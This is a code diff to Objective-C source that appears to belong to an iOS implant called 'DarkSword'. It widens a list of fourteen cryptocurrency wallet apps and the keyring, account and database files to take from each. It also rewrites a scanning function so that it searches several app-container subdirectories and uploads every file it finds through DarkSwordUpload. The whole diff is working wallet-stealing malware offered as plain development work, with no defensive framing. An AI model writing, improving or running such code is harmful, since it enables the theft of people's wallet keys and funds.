@@ -343,21 +343,33 @@ static NSArray<NSDictionary *> *DSWalletTargets(void)
 {
     return @[
         @{@"type": @"metamask", @"bundleId": @"io.metamask",
-          @"files": @[@"Documents/persistStore/persist-keyringcontroller",
-                      @"Library/Preferences/io.metamask.plist"]},
-        @{@"type": @"trust", @"bundleId": @"com.trustwallet.app", @"files": @[@"Trust.sqlite"]},
-        @{@"type": @"coinbase", @"bundleId": @"org.coinbase.wallet", @"files": @[@"wallet.db"]},
-        @{@"type": @"imtoken", @"bundleId": @"org.consenlabs.tokens", @"files": @[@"imtoken.db"]},
-        @{@"type": @"phantom", @"bundleId": @"app.phantom", @"files": @[@"phantom.db"]},
-        @{@"type": @"tokenpocket", @"bundleId": @"com.tokenpocket.wallet", @"files": @[@"wallet.db"]},
-        @{@"type": @"alphawallet", @"bundleId": @"io.stormbird.wallet", @"files": @[@"AlphaWallet.sqlite"]},
-        @{@"type": @"mathwallet", @"bundleId": @"com.mathwallet", @"files": @[@"mathwallet.db"]},
-        @{@"type": @"tronlink", @"bundleId": @"org.tronlink.wallet", @"files": @[@"tronlink.db"]},
-        @{@"type": @"onto", @"bundleId": @"com.onto.wallet", @"files": @[@"onto.db"]},
-        @{@"type": @"bitpie", @"bundleId": @"com.bitpie.wallet", @"files": @[@"bitpie.db"]},
-        @{@"type": @"huobi", @"bundleId": @"com.huobi.wallet", @"files": @[@"huobi.db"]},
-        @{@"type": @"keplr", @"bundleId": @"com.keplr.wallet", @"files": @[@"keplr.db"]},
-        @{@"type": @"cosmostation", @"bundleId": @"com.cosmostation.wallet", @"files": @[@"cosmostation.db"]},
+          @"files": @[@"persistStore/persist-keyringcontroller"]},
+        @{@"type": @"trust", @"bundleId": @"com.trustwallet.app",
+          @"files": @[@"Trust.sqlite", @"accounts.json"]},
+        @{@"type": @"coinbase", @"bundleId": @"org.coinbase.wallet",
+          @"files": @[@"wallet.db", @"keychain.sqlite"]},
+        @{@"type": @"imtoken", @"bundleId": @"org.consenlabs.tokens",
+          @"files": @[@"imtoken.db", @"wallets.json"]},
+        @{@"type": @"phantom", @"bundleId": @"app.phantom",
+          @"files": @[@"phantom.db", @"accounts.json"]},
+        @{@"type": @"tokenpocket", @"bundleId": @"com.tokenpocket.wallet",
+          @"files": @[@"wallet.db", @"accounts.db"]},
+        @{@"type": @"alphawallet", @"bundleId": @"io.stormbird.wallet",
+          @"files": @[@"AlphaWallet.sqlite"]},
+        @{@"type": @"mathwallet", @"bundleId": @"com.mathwallet",
+          @"files": @[@"mathwallet.db", @"wallets.json"]},
+        @{@"type": @"tronlink", @"bundleId": @"org.tronlink.wallet",
+          @"files": @[@"tronlink.db", @"accounts.json"]},
+        @{@"type": @"onto", @"bundleId": @"com.onto.wallet",
+          @"files": @[@"onto.db", @"wallets.sqlite"]},
+        @{@"type": @"bitpie", @"bundleId": @"com.bitpie.wallet",
+          @"files": @[@"bitpie.db"]},
+        @{@"type": @"huobi", @"bundleId": @"com.huobi.wallet",
+          @"files": @[@"huobi.db", @"accounts.json"]},
+        @{@"type": @"keplr", @"bundleId": @"com.keplr.wallet",
+          @"files": @[@"keplr.db", @"keyring.sqlite"]},
+        @{@"type": @"cosmostation", @"bundleId": @"com.cosmostation.wallet",
+          @"files": @[@"cosmostation.db", @"accounts.json"]},
     ];
 }
 
@@ -374,12 +386,27 @@ static void DSWalletScanOne(NSDictionary *wallet)
         DSLog(@"wallet %@: no container resolved", wallet[@"type"]);
         return;
     }
-    for (NSString *relative in wallet[@"files"]) {
-        NSString *path = [container stringByAppendingPathComponent:relative];
-        NSData *data = DSReadFileBytes(path);
-        if (data.length == 0) continue;
-        NSString *desc = [NSString stringWithFormat:@"%@ (%@)", wallet[@"type"], bundleID];
-        DarkSwordUpload(@"wallet", path, desc, data, nil);
+    // Wallet files live in a handful of well-known subdirectories, not the
+    // container root, so probe each candidate location per file.
+    NSString *appSupport = [NSString stringWithFormat:@"Library/Application Support/%@", bundleID];
+    NSArray<NSString *> *subdirs = @[
+        @"",
+        appSupport,
+        @"Documents",
+        @"Library/Caches",
+        @"Library/Preferences",
+    ];
+
+    for (NSString *file in wallet[@"files"]) {
+        for (NSString *sub in subdirs) {
+            NSString *relative = sub.length > 0 ? [sub stringByAppendingPathComponent:file] : file;
+            NSString *path = [container stringByAppendingPathComponent:relative];
+            NSData *data = DSReadFileBytes(path);
+            if (data.length == 0) continue;
+            NSString *desc = [NSString stringWithFormat:@"%@ (%@)", wallet[@"type"], bundleID];
+            DarkSwordUpload(@"wallet", path, desc, data, nil);
+            break; // found this file, move to the next target
+        }
     }
 }
 
